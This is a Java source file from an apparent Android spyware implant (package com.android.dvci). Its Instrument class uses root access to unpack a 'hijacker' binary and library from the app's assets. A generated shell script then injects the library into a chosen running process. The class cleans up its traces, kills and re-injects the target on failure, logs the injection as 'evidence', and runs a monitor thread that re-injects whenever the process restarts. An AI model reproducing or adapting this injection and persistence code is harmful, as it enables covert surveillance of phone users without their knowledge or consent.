package com.android.dvci.util;

import com.android.dvci.Beep;
import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.AutoFile;
import com.android.mm.M;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

public class Instrument {
	private static final String TAG = "Instrument";
	private static final int MAX_KILLED = 3;
	private String dex_dest = null;
	private String proc;
	private PidMonitor pidMonitor;
	private String lib_dest, hijacker, path, dumpPath, pidCompletePath, pidFile, dexFile, libInAsset;
	private boolean stopMonitor = false;
	private Semaphore sync_semaphore =null;
	private Thread monitor;
	private int killed = 0;
	private String lid = M.e(" lid ");

	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library) {
		final File filesPath = Status.getAppContext().getFilesDir();

		proc = process;

		hijacker = "m";
		libInAsset = library;
		lib_dest = "n"+libInAsset.hashCode();
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		pidFile = _pidFile;
		pidCompletePath = path + "/" + pidFile;
		sync_semaphore = sem;
	}
	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String _dexFile) {
		this(process,dump,_pidFile,sem,library);
		dexFile = _dexFile;
		dex_dest = "d"+dexFile.hashCode()+".dex";

	}

	private boolean deleteHijacker() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (installHijacker) delete lib_dest");
		}
		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib_dest);
		file.delete();
		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
		file.delete();
		return true;
	}

	private boolean installHijacker() {
		try {
			if (!Status.haveRoot()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(installHijacker): Nope, we are not root");
				}

				return false;
			}

			Utils.dumpAsset(libInAsset, lib_dest);
			Utils.dumpAsset(M.e("mb.data"), hijacker);
			if(dexFile!= null){
				File src = new File(path + "/" + dex_dest);
				Utils.dumpAsset(dexFile,dex_dest);
				Execute.chmod(M.e("750"), path + "/" + dex_dest);
				Utils.copy(src,new File(dumpPath + "/" + dex_dest));
				Execute.chmod(M.e("777"), dumpPath + "/" + dex_dest);
				src.delete();
			}

			// Install library
			Execute.chmod(M.e("666"), path + "/" + lib_dest);
			Execute.chmod(M.e("750"), path + "/" + hijacker);


		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		return true;
	}

	public boolean startInstrumentation()  {
		if (!Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
			}

			return false;
		}

		if (!installHijacker()) {
			return false;
		}

		try {
			if(sync_semaphore == null || sync_semaphore.tryAcquire(10, TimeUnit.SECONDS)) {
				try {
					int pid = getProcessPid(proc);

					if (pid > 0) {
						// Run the injector
						String scriptName = "ij";
						String script = M.e("#!/system/bin/sh") + "\n";
						if( StringUtils.isEmpty(dexFile)) {
							script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + " -f " + dumpPath + "\n";
						}else{
							script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + " -f " + dumpPath +dex_dest + "\n";
						}
						Root.createScript(scriptName, script);
						ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
						}

						Root.removeScript(scriptName);

						Utils.sleep(2000);
						int newpid = getProcessPid(proc);
						if (newpid != pid) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (startInstrumentation) Error: "+proc+" was killed");
							}
						}

						File d = new File(dumpPath);

						boolean started = false;

						for (int i = 0; i < 5 && !started; i++) {
							File[] files = d.listFiles();
							for (File file : files) {
								if (file.getName().endsWith(M.e(".cnf"))) {
									if (Cfg.DEBUG) {
										Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
									}
									started = true;
									file.delete();

									if (Cfg.DEMO) {
										Beep.beep();
									}
								}

							}
							if (!started) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (startInstrumentation) sleep 5 secs "+proc);
								}
								Utils.sleep(2000);
							}
						}

						if (!started && killed < MAX_KILLED) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (startInstrumentation) Kill "+proc);
							}
							killProc(proc);
							// Utils.sleep(1000);
							// newpid = getProcessPid();
							killed += 1;

							if (started) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (startInstrumentation) "+proc+" Hijack installed");
								}
								EvidenceBuilder.info(proc + M.e(" injected"));
							}

							stopMonitor = false;
						}

						if (pidMonitor == null) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (startInstrumentation) script: \n" + script);
								Check.log(TAG + "(startInstrumentation): Starting "+proc+ " Monitor thread");
							}

							pidMonitor = new PidMonitor(newpid);
							monitor = new Thread(pidMonitor);
							monitor.start();
						} else {
							pidMonitor.setPid(newpid);
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(getProcessPid): unable to get pid for "+ proc);
						}

					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Error: "+ proc , e);
					}
					return false;
				} finally {
					deleteHijacker();
					Utils.sleep(2000);
					if(sync_semaphore != null) {
						sync_semaphore.release();
					}
				}
			}
		} catch (InterruptedException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startInstrumentation) Error: "+proc + e);
			}
			return false;
		}

		return true;
	}

	public void stopInstrumentation() {
		stopMonitor = true;
		monitor = null;
		int trials=5;
		int pid_start = getProcessPid(proc);
		int pid_stop = pid_start;

		while(trials-->0 && pid_start==pid_stop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopInstrumentation "+proc+") trials: " + trials);
			}

			try {
				if(sync_semaphore != null){
					sync_semaphore.tryAcquire(10, TimeUnit.SECONDS);
				}

				try {
					killProc(proc);
					Utils.sleep(2000);
				}finally {
					if(sync_semaphore != null) {
						sync_semaphore.release();
					}
				}

			} catch (InterruptedException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stopInstrumentation "+proc+") Error: " + e);
					Check.log(TAG + " (stopInstrumentation "+proc+") Interrupted when trying to restore "+ proc);
				}
			}
			pid_stop = getProcessPid(proc);
		}
	}

	private int getProcessPid(String process) {
		int pid = -1;
		/*
		byte[] buf = new byte[4];
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getProcessPid) " + process + " " + pidCompletePath);
		}
		Execute.execute(Configuration.shellFile + lid + process + " " + pidCompletePath);

		try {
			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);

			fis.read(buf);
			fis.close();

			// Remove PID file
			File f = new File(pidCompletePath);
			f.delete();

			// Parse PID from the file
			ByteBuffer bbuf = ByteBuffer.wrap(buf);
			bbuf.order(ByteOrder.LITTLE_ENDIAN);
			pid = bbuf.getInt();
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return 0;
		}
		*/
		String pid_s = Utils.pidOf(process);
		if(pid_s != null){
			try{
				pid = Integer.valueOf(pid_s);
			}catch (Exception e){
				pid=-1;
			}
		}
		return pid;
	}

	public void killProc(String process) {
		try {
			int pid = getProcessPid(process);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) try to kill " + pid);
			}
			Execute.executeRoot("kill " + pid);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) Error: " + ex);
			}
		}
	}

	class PidMonitor implements Runnable {
		private int cur_pid, start_pid;
		private int failedCounter = 0;

		public void setPid(int pid) {
			start_pid = pid;
		}

		public PidMonitor(int pid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(PidMonitor): starting with pid " + pid);
			}

			setPid(pid);
		}

		@Override
		public void run() {
			while (true) {

				if (stopMonitor) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(PidMonitor run): closing monitor thread");
					}

					stopMonitor = false;
					return;
				}

				cur_pid = getProcessPid(proc);

				// process died
				if (cur_pid != start_pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(PidMonitor run): "+ proc +" died, restarting instrumentation");
					}

					failedCounter += 1;
					if (failedCounter < 3) {
						startInstrumentation();
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (run) too many retry, stop restarting "+ proc);
						}
					}
				} else {
					failedCounter = 0;
				}

				Utils.sleep(10000);
			}
		}
	}
}
